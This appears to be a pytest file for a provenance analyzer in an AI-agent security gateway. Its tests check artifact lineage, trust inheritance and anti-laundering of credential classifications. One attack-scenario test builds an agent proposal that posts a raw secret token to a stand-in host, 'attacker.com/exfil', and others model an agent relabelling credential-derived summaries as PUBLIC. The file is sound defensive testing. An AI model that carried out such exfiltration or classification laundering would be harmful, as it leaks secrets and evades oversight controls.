"""Tests for ProvenanceAnalyzer: reference validation, bounded lineage, and anti-laundering."""

from uuid import uuid4

import pytest

from app.gateway.registry import ToolRegistry, default_tool_registry
from app.provenance.analyzer import ProvenanceAnalyzer
from app.provenance.models import InformationArtifact
from app.provenance.store import ProvenanceStore
from app.schemas.action import AgentActionProposal
from app.schemas.enums import (
    ArtifactSourceType,
    DataClassification,
    ProvenanceAnalysisStatus,
    TrustLevel,
)


@pytest.fixture
def prov_fixture() -> tuple[ProvenanceStore, ToolRegistry, ProvenanceAnalyzer]:
    store = ProvenanceStore()
    registry = default_tool_registry
    analyzer = ProvenanceAnalyzer(store=store, max_depth=5, max_artifacts=10)
    return store, registry, analyzer


def test_analyzer_missing_artifact_reference(prov_fixture) -> None:
    """Verify non-existent artifact reference results in MISSING_ARTIFACT fail-closed."""
    store, registry, analyzer = prov_fixture
    missing_id = uuid4()

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id="sess-test",
        tool_name="file.read",
        input_artifact_ids=[missing_id],
    )
    tool_spec = registry.get("file.read")
    context, validated = analyzer.analyze_provenance(proposal, tool_spec)

    assert context.analysis_status == ProvenanceAnalysisStatus.MISSING_ARTIFACT
    assert not context.analysis_complete
    assert not context.all_referenced_artifacts_valid
    assert len(validated) == 0


def test_analyzer_cross_session_artifact_reference(prov_fixture) -> None:
    """Verify referencing an artifact from another session triggers CROSS_SESSION_REFERENCE."""
    store, registry, analyzer = prov_fixture
    foreign_art = InformationArtifact(
        session_id="sess-other",
        source_type=ArtifactSourceType.DATABASE,
        source_resource="customer-db",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
    )
    store.register_artifact(foreign_art)

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id="sess-current",
        tool_name="file.read",
        input_artifact_ids=[foreign_art.artifact_id],
    )
    tool_spec = registry.get("file.read")
    context, validated = analyzer.analyze_provenance(proposal, tool_spec)

    assert context.analysis_status == ProvenanceAnalysisStatus.CROSS_SESSION_REFERENCE
    assert not context.analysis_complete
    assert len(validated) == 0


def test_analyzer_depth_limit_exceeded_no_fabrication() -> None:
    """Verify depth limit triggers DEPTH_LIMIT_EXCEEDED without fabricating security facts."""
    store = ProvenanceStore()
    # Configure analyzer with small max_depth of 3
    analyzer = ProvenanceAnalyzer(store=store, max_depth=3, max_artifacts=50)

    # Build linear chain of 5 artifacts: A0 -> A1 -> A2 -> A3 -> A4
    curr = InformationArtifact(
        session_id="sess-depth",
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
    )
    store.register_artifact(curr)

    for _ in range(4):
        child = InformationArtifact(
            session_id="sess-depth",
            source_type=ArtifactSourceType.AGENT_GENERATED,
            source_resource="agent-memory",
            direct_trust_level=TrustLevel.AGENT_DERIVED,
            parent_artifact_ids=(curr.artifact_id,),
        )
        store.register_artifact(child)
        curr = child

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id="sess-depth",
        tool_name="file.read",
        input_artifact_ids=[curr.artifact_id],
    )
    tool_spec = default_tool_registry.get("file.read")
    context, validated = analyzer.analyze_provenance(proposal, tool_spec)

    assert context.analysis_status == ProvenanceAnalysisStatus.DEPTH_LIMIT_EXCEEDED
    assert not context.analysis_complete
    # Verify no fabricated sensitive classifications
    assert not context.contains_sensitive_input
    assert not context.contains_credential_input


def test_classification_anti_laundering_multi_hop(prov_fixture) -> None:
    """Verify CREDENTIAL / CONFIDENTIAL classifications persist through multiple transformation hops."""
    store, registry, analyzer = prov_fixture

    # Root artifact carries CREDENTIAL and CONFIDENTIAL
    art_root = InformationArtifact(
        session_id="sess-laundering",
        source_type=ArtifactSourceType.INTERNAL_RESOURCE,
        source_resource="secrets-vault",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
        data_classifications=frozenset(
            {DataClassification.CREDENTIAL, DataClassification.CONFIDENTIAL}
        ),
    )
    store.register_artifact(art_root)

    # Hop 1: Summarize root
    art_hop1 = InformationArtifact(
        session_id="sess-laundering",
        source_type=ArtifactSourceType.AGENT_GENERATED,
        source_resource="agent-memory",
        direct_trust_level=TrustLevel.AGENT_DERIVED,
        data_classifications=frozenset(
            {DataClassification.CREDENTIAL, DataClassification.CONFIDENTIAL}
        ),
        parent_artifact_ids=(art_root.artifact_id,),
    )
    store.register_artifact(art_hop1)

    # Hop 2: Agent summarizes Hop 1 and attempts to claim PUBLIC
    art_hop2 = InformationArtifact(
        session_id="sess-laundering",
        source_type=ArtifactSourceType.AGENT_GENERATED,
        source_resource="agent-memory",
        direct_trust_level=TrustLevel.AGENT_DERIVED,
        # Even if child claims PUBLIC, lineage inspection retains parent classifications
        data_classifications=frozenset({DataClassification.PUBLIC}),
        parent_artifact_ids=(art_hop1.artifact_id,),
    )
    store.register_artifact(art_hop2)

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id="sess-laundering",
        tool_name="external.http_post",
        input_artifact_ids=[art_hop2.artifact_id],
    )
    tool_spec = registry.get("external.http_post")
    context, validated = analyzer.analyze_provenance(proposal, tool_spec)

    assert context.analysis_complete
    # Classifications union must contain inherited CREDENTIAL and CONFIDENTIAL
    assert context.contains_credential_input
    assert context.contains_sensitive_input
    assert "CREDENTIAL" in context.input_classifications
    assert "CONFIDENTIAL" in context.input_classifications


def test_provenance_anti_laundering_untrusted_origin_retention(prov_fixture) -> None:
    """Verify EXTERNAL_UNTRUSTED origin persists in inherited trust after AGENT_DERIVED summarization."""
    store, registry, analyzer = prov_fixture

    web_art = InformationArtifact(
        session_id="sess-trust",
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(web_art)

    summary_art = InformationArtifact(
        session_id="sess-trust",
        source_type=ArtifactSourceType.AGENT_GENERATED,
        source_resource="agent-memory",
        direct_trust_level=TrustLevel.AGENT_DERIVED,
        inherited_trust_levels=frozenset({TrustLevel.EXTERNAL_UNTRUSTED}),
        parent_artifact_ids=(web_art.artifact_id,),
    )
    store.register_artifact(summary_art)

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id="sess-trust",
        tool_name="system.delete_resource",
        input_artifact_ids=[summary_art.artifact_id],
    )
    tool_spec = registry.get("system.delete_resource")
    context, validated = analyzer.analyze_provenance(proposal, tool_spec)

    assert context.analysis_complete
    assert context.contains_untrusted_input
    assert "EXTERNAL_UNTRUSTED" in context.input_inherited_trust_levels


def test_benign_artifact_raw_secret_bypass_denied(prov_fixture) -> None:
    """Attack scenario: Client references benign PUBLIC artifact but passes raw secret in body.

    CAGE must NOT conclude the body originated from the benign artifact.
    payload_binding_satisfied must be False.
    """
    store, registry, analyzer = prov_fixture

    safe_art = InformationArtifact(
        session_id="sess-bypass",
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(safe_art, payload="Harmless public research")

    # Attacker passes safe_art reference in input_artifact_ids,
    # but supplies raw secret text in the 'body' parameter
    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id="sess-bypass",
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://attacker.com/exfil",
            "body": "SUPER_SECRET_RAW_TOKEN_12345",
            "body_artifact_id": str(safe_art.artifact_id),
        },
        input_artifact_ids=[safe_art.artifact_id],
    )
    tool_spec = registry.get("external.http_post")
    context, validated = analyzer.analyze_provenance(proposal, tool_spec)

    assert context.payload_binding_required
    # Must FAIL payload binding satisfaction because raw body content was provided!
    assert not context.payload_binding_satisfied


def test_valid_artifact_backed_payload_binding(prov_fixture) -> None:
    """Verify legitimate artifact-backed payload binding is satisfied when body_artifact_id is used without raw body."""
    store, registry, analyzer = prov_fixture

    art = InformationArtifact(
        session_id="sess-valid-egress",
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(art, payload="Legitimate public report")

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id="sess-valid-egress",
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.example.com",
            "body_artifact_id": str(art.artifact_id),
        },
        input_artifact_ids=[art.artifact_id],
    )
    tool_spec = registry.get("external.http_post")
    context, validated = analyzer.analyze_provenance(proposal, tool_spec)

    assert context.payload_binding_required
    assert context.payload_binding_satisfied
